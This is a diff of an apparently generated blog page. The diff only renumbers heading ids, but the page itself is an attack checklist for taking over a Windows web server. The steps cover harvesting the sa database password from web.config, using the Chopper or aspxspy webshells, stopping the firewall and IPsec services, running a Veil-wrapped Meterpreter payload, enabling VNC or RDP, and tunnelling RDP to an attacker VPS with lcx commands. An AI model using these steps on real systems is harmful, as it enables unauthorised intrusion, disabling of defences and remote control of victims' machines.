@@ -142,9 +142,9 @@
 
         
 
-        <span itemprop="articleBody"><h3 id="search-webconfig-to-find-sa-and-sa-password">1&gt;search web.config———&gt; to find sa and sa password</h3>
+        <span itemprop="articleBody"><h3 id="1search-webconfig-to-find-sa-and-sa-password">1&gt;search web.config———&gt; to find sa and sa password</h3>
 
-<h3 id="choppperor-aspxspyto-connect-dbget-sa-privilege">2&gt;choppper(or aspxspy)to connect db,get sa privilege</h3>
+<h3 id="2choppperor-aspxspyto-connect-dbget-sa-privilege">2&gt;choppper(or aspxspy)to connect db,get sa privilege</h3>
 <div class="highlighter-rouge"><pre class="highlight"><code>sometimes strong webshell (like aspxspy.aspx) cannot get system privilege with sa and pass,try:
 1.use sa execute cmd in chopper
 or
@@ -152,13 +152,13 @@ or
 </code></pre>
 </div>
 
-<h3 id="net-stop-sharedaccess">3&gt;net stop sharedaccess</h3>
+<h3 id="3net-stop-sharedaccess">3&gt;net stop sharedaccess</h3>
 
-<h3 id="net-stop-policyagent">4&gt;net stop policyagent</h3>
+<h3 id="4net-stop-policyagent">4&gt;net stop policyagent</h3>
 
-<h3 id="use-sa-pri-run-meterpreteruse-veil-to-jail-payload">5&gt;use sa pri run meterpreter(use veil to jail) payload</h3>
+<h3 id="5use-sa-pri-run-meterpreteruse-veil-to-jail-payload">5&gt;use sa pri run meterpreter(use veil to jail) payload</h3>
 
-<h3 id="use-meterpreter-shell-to-open-vnc-or-desktop">6&gt;use meterpreter shell to open vnc or desktop</h3>
+<h3 id="6use-meterpreter-shell-to-open-vnc-or-desktop">6&gt;use meterpreter shell to open vnc or desktop</h3>
 <div class="highlighter-rouge"><pre class="highlight"><code>meterpreter&gt;run vnc
 or
 meterpreter&gt;background
@@ -166,7 +166,7 @@ msf&gt;use post/windows/manage/enable_rdp
 </code></pre>
 </div>
 
-<h3 id="if-6-failuse-sa-privilegesin-chopperto-run">7&gt;if 6 fail,use sa privileges(in chopper)to run:</h3>
+<h3 id="7if-6-failuse-sa-privilegesin-chopperto-run">7&gt;if 6 fail,use sa privileges(in chopper)to run:</h3>
 <div class="highlighter-rouge"><pre class="highlight"><code>victim:lcx -slave vps_ip vps_port victim_ip 3389
 vps:lcx -listen vps_port 1234
 vps:mstsc /console /v:127.0.0.1:1234  
